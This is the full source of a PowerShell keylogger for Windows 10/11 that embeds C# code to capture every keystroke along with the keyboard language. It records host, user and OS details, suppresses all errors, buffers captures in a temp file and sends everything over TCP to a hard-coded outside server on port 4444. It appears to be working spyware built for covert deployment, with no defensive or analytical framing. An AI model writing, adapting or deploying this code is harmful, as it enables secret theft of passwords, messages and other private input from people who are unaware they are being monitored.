# keylogger.ps1 — Windows 10/11, correct keyboard language via foreground HKL
# Protocol: each TCP payload starts with meta line, then UTF-8 key text
# Server: 89.22.229.54:4444 → GitHub captures/ per user per minute

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
$WarningPreference     = 'SilentlyContinue'
$VerbosePreference     = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'

$ServerIP    = '89.22.229.54'
$ServerPort  = 4444
$ConnectMs   = 4000
$FlushEvery  = 16
$TimerMs     = 8000
$BufPath     = Join-Path $env:TEMP 'kl.buf'
$MaxBufBytes = 262144
$MutexName   = 'Local\FlipperKL_Win1011_v2'

$script:HostName = $env:COMPUTERNAME
$script:UserName = $env:USERNAME
$script:LastLang = ''

$script:Mutex = $null
try {
    $script:Mutex = New-Object System.Threading.Mutex($false, $MutexName)
    if (-not $script:Mutex.WaitOne(0, $false)) { exit 0 }
} catch {}

try {
    $tls = [enum]::Parse([Net.SecurityProtocolType], 'Tls12')
    try { $tls = $tls -bor [enum]::Parse([Net.SecurityProtocolType], 'Tls13') } catch {}
    [Net.ServicePointManager]::SecurityProtocol = $tls
} catch {
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
}

function Send-Log {
    param([string]$Data)
    if ([string]::IsNullOrEmpty($Data)) { return $false }
    $client = $null
    $stream = $null
    try {
        $ip = [Net.IPAddress]::Parse($ServerIP)
        $client = New-Object System.Net.Sockets.TcpClient($ip.AddressFamily)
        $iar = $client.BeginConnect($ip, $ServerPort, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne($ConnectMs, $false)) {
            try { $client.Close() } catch {}
            return $false
        }
        try { $client.EndConnect($iar) } catch { return $false }
        if (-not $client.Connected) { return $false }
        $stream = $client.GetStream()
        $stream.WriteTimeout = $ConnectMs
        $stream.ReadTimeout  = $ConnectMs
        $bytes = [Text.Encoding]::UTF8.GetBytes($Data)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        return $true
    } catch {
        return $false
    } finally {
        if ($stream) { try { $stream.Close() } catch {} }
        if ($client) { try { $client.Close() } catch {} }
    }
}

function Append-Local {
    param([string]$Data)
    try {
        $fi = Get-Item -LiteralPath $BufPath -ErrorAction SilentlyContinue
        if ($fi -and $fi.Length -gt $MaxBufBytes) {
            $tail = [IO.File]::ReadAllText($BufPath)
            if ($tail.Length -gt 8192) { $tail = $tail.Substring($tail.Length - 8192) }
            [IO.File]::WriteAllText($BufPath, $tail + $Data)
        } else {
            [IO.File]::AppendAllText($BufPath, $Data, [Text.Encoding]::UTF8)
        }
    } catch {}
}

# Meta header so server can route to captures/HOST/USER/date/minute.txt
function Format-Packet {
    param([string]$Body, [string]$LangHex, [string]$LangTag)
    $h = $script:HostName -replace '[\|\\/]', '_'
    $u = $script:UserName -replace '[\|\\/]', '_'
    if ([string]::IsNullOrEmpty($LangHex)) { $LangHex = '0000' }
    if ([string]::IsNullOrEmpty($LangTag)) { $LangTag = 'unk' }
    return ("#KL|v=2|host={0}|user={1}|lang={2}|tag={3}`n{4}" -f $h, $u, $LangHex, $LangTag, $Body)
}

function Flush-Queue {
    param([System.Text.StringBuilder]$Sb, [string]$LangHex, [string]$LangTag)
    if ($null -eq $Sb -or $Sb.Length -eq 0) { return }
    $chunk = $Sb.ToString()
    [void]$Sb.Clear()
    $pkt = Format-Packet -Body $chunk -LangHex $LangHex -LangTag $LangTag
    if (-not (Send-Log $pkt)) { Append-Local $pkt }
}

$API = $null
try { $API = [FlipperKL.KLApi2] } catch { $API = $null }
if ($null -eq $API) {
    $cs = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace FlipperKL {
  public static class KLApi2 {
    public const int WH_KEYBOARD_LL = 13;
    public const int WM_KEYDOWN = 0x0100;
    public const int WM_SYSKEYDOWN = 0x0104;

    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern short GetKeyState(int nVirtKey);
    [DllImport("user32.dll")] public static extern bool GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")] public static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);
    [DllImport("user32.dll")] public static extern IntPtr GetKeyboardLayout(uint idThread);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    [DllImport("user32.dll")]
    public static extern int ToUnicodeEx(
      uint wVirtKey, uint wScanCode, byte[] lpKeyState,
      [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
      int cchBuff, uint wFlags, IntPtr dwhkl);

    // HKL of window that currently has focus (correct RU/EN while typing)
    public static IntPtr ForegroundHkl() {
      IntPtr hwnd = GetForegroundWindow();
      if (hwnd == IntPtr.Zero) return GetKeyboardLayout(0);
      uint pid;
      uint tid = GetWindowThreadProcessId(hwnd, out pid);
      return GetKeyboardLayout(tid);
    }

    public static string HklToHex(IntPtr hkl) {
      uint v = unchecked((uint)hkl.ToInt64());
      // low word = language id (e.g. 0x0419 ru, 0x0409 en)
      return (v & 0xFFFF).ToString("x4");
    }

    public static string HklToTag(IntPtr hkl) {
      uint lang = unchecked((uint)hkl.ToInt64()) & 0xFFFF;
      switch (lang) {
        case 0x0409: return "en-US";
        case 0x0809: return "en-GB";
        case 0x0419: return "ru-RU";
        case 0x0422: return "uk-UA";
        case 0x0407: return "de-DE";
        case 0x040c: return "fr-FR";
        case 0x0410: return "it-IT";
        case 0x040a: return "es-ES";
        case 0x0415: return "pl-PL";
        case 0x041f: return "tr-TR";
        case 0x0411: return "ja-JP";
        case 0x0412: return "ko-KR";
        case 0x0804: return "zh-CN";
        case 0x0404: return "zh-TW";
        case 0x0416: return "pt-BR";
        case 0x0413: return "nl-NL";
        case 0x041d: return "sv-SE";
        case 0x040e: return "hu-HU";
        case 0x0405: return "cs-CZ";
        case 0x0408: return "el-GR";
        case 0x0401: return "ar-SA";
        case 0x040d: return "he-IL";
        default: return "lang-" + lang.ToString("x4");
      }
    }

    // Returns "langHex\tlangTag\ttext" (text may be empty). Null string => no char.
    public static string VkToPacket(int vk) {
      IntPtr hkl = ForegroundHkl();
      string langHex = HklToHex(hkl);
      string langTag = HklToTag(hkl);

      byte[] state = new byte[256];
      if (!GetKeyboardState(state)) {
        for (int i = 0; i < 256; i++) {
          short s = GetAsyncKeyState(i);
          if ((s & 0x8000) != 0) state[i] = 0x80;
        }
      }
      state[vk] = (byte)(state[vk] | 0x80);
      if ((GetKeyState(0x14) & 1) != 0) state[0x14] |= 0x01;

      uint scan = MapVirtualKeyEx((uint)vk, 0, hkl);
      StringBuilder sb = new StringBuilder(16);
      int rc = ToUnicodeEx((uint)vk, scan, state, sb, sb.Capacity, 0, hkl);
      string text = null;
      if (rc > 0) text = sb.ToString();
      else if (rc < 0) {
        StringBuilder dump = new StringBuilder(16);
        ToUnicodeEx(0x20, MapVirtualKeyEx(0x20, 0, hkl), state, dump, dump.Capacity, 0, hkl);
        sb.Clear();
        rc = ToUnicodeEx((uint)vk, scan, state, sb, sb.Capacity, 0, hkl);
        text = (rc > 0) ? sb.ToString() : "";
      }
      if (text == null) return null;
      return langHex + "\t" + langTag + "\t" + text;
    }
  }
}
'@
    try { Add-Type -TypeDefinition $cs -Language CSharp -ErrorAction Stop | Out-Null } catch {}
    try { $API = [FlipperKL.KLApi2] } catch { $API = $null }
}
if ($null -eq $API) { exit 0 }

function Map-Special([int]$vk) {
    switch ($vk) {
        0x08 { return '[BS]' }
        0x09 { return '[TAB]' }
        0x0D { return "[ENT]`n" }
        0x1B { return '[ESC]' }
        0x2E { return '[DEL]' }
        0x25 { return '[LEFT]' }
        0x26 { return '[UP]' }
        0x27 { return '[RIGHT]' }
        0x28 { return '[DOWN]' }
        0x21 { return '[PGUP]' }
        0x22 { return '[PGDN]' }
        0x23 { return '[END]' }
        0x24 { return '[HOME]' }
        0x2D { return '[INS]' }
        0x14 { return '[CAPS]' }
        0x5B { return '[WIN]' }
        0x5C { return '[RWIN]' }
        0x5D { return '[APP]' }
        0x2C { return '[PRTSC]' }
        0x90 { return '[NUMLK]' }
        0x91 { return '[SCRLK]' }
        0x13 { return '[PAUSE]' }
        0x10 { return '' }
        0xA0 { return '' }
        0xA1 { return '' }
        0x11 { return '' }
        0xA2 { return '' }
        0xA3 { return '' }
        0x12 { return '' }
        0xA4 { return '' }
        0xA5 { return '' }
    }
    if ($vk -ge 0x70 -and $vk -le 0x7B) { return ('[F' + ($vk - 0x6F) + ']') }
    return $null
}

function Map-Key([int]$vk, [ref]$LangHex, [ref]$LangTag) {
    $sp = Map-Special $vk
    if ($null -ne $sp) {
        try {
            $hkl = $API::ForegroundHkl()
            $LangHex.Value = $API::HklToHex($hkl)
            $LangTag.Value = $API::HklToTag($hkl)
        } catch {}
        return $sp
    }

    try {
        $pkt = $API::VkToPacket($vk)
        if ($null -eq $pkt) { return $null }
        $parts = $pkt -split "`t", 3
        if ($parts.Count -ge 3) {
            $LangHex.Value = $parts[0]
            $LangTag.Value = $parts[1]
            return $parts[2]
        }
    } catch {}

    try {
        $shift = ($API::GetKeyState(0x10) -band 0x8000) -ne 0
        if ($vk -ge 0x30 -and $vk -le 0x39) {
            if (-not $shift) { return [string][char]$vk }
            return ')!@#$%^&*('.Substring($vk - 0x30, 1)
        }
        if ($vk -ge 0x41 -and $vk -le 0x5A) {
            $caps = ($API::GetKeyState(0x14) -band 0x0001) -ne 0
            $upper = $caps -xor $shift
            if ($upper) { return [string][char]$vk }
            return [string][char]($vk + 32)
        }
    } catch {}
    return $null
}

# boot banner
$langHex = '0000'
$langTag = 'unk'
try {
    $h0 = $API::ForegroundHkl()
    $langHex = $API::HklToHex($h0)
    $langTag = $API::HklToTag($h0)
} catch {}
$script:LastLang = $langHex

$osCaption = ''
$osBuild = ''
try {
    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    if ($os) { $osCaption = [string]$os.Caption; $osBuild = [string]$os.BuildNumber }
} catch {}
$bootBody = "--- BOOT host=$script:HostName user=$script:UserName os=$osCaption build=$osBuild ps=$($PSVersionTable.PSVersion) lang=$langHex tag=$langTag ts=$([DateTime]::UtcNow.ToString('o')) ---`n"
$bootPkt = Format-Packet -Body $bootBody -LangHex $langHex -LangTag $langTag
[void](Send-Log $bootPkt)
Append-Local $bootPkt

$sb = New-Object System.Text.StringBuilder 4096
$curLang = $langHex
$curTag = $langTag
$lastFlush = [Environment]::TickCount

try {
    while ($true) {
        try {
            for ($k = 8; $k -le 254; $k++) {
                $st = $API::GetAsyncKeyState($k)
                if (($st -band 0x0001) -eq 0) { continue }

                $lh = $curLang
                $lt = $curTag
                $ch = Map-Key $k ([ref]$lh) ([ref]$lt)
                if ($null -eq $ch -or $ch -eq '') { continue }

                # language switch marker + flush old lang buffer
                if ($lh -ne $curLang -and $sb.Length -gt 0) {
                    Flush-Queue $sb $curLang $curTag
                }
                if ($lh -ne $curLang) {
                    $curLang = $lh
                    $curTag = $lt
                    [void]$sb.Append(("[LANG:{0}|{1}]" -f $lh, $lt))
                    $script:LastLang = $lh
                }

                [void]$sb.Append($ch)
                if ($sb.Length -ge $FlushEvery) {
                    Flush-Queue $sb $curLang $curTag
                    $lastFlush = [Environment]::TickCount
                }
            }

            $now = [Environment]::TickCount
            $delta = [int]($now - $lastFlush)
            if ($delta -lt 0) { $delta = $TimerMs }
            if ($delta -ge $TimerMs) {
                Flush-Queue $sb $curLang $curTag
                try {
                    if (Test-Path -LiteralPath $BufPath) {
                        $offline = [IO.File]::ReadAllText($BufPath)
                        if ($offline.Length -gt 0 -and (Send-Log $offline)) {
                            Remove-Item -LiteralPath $BufPath -Force -ErrorAction SilentlyContinue
                        }
                    }
                } catch {}
                $lastFlush = $now
            }
        } catch {}
        Start-Sleep -Milliseconds 8
    }
} finally {
    try { if ($script:Mutex) { [void]$script:Mutex.ReleaseMutex() } } catch {}
    try { if ($script:Mutex) { $script:Mutex.Dispose() } } catch {}
}
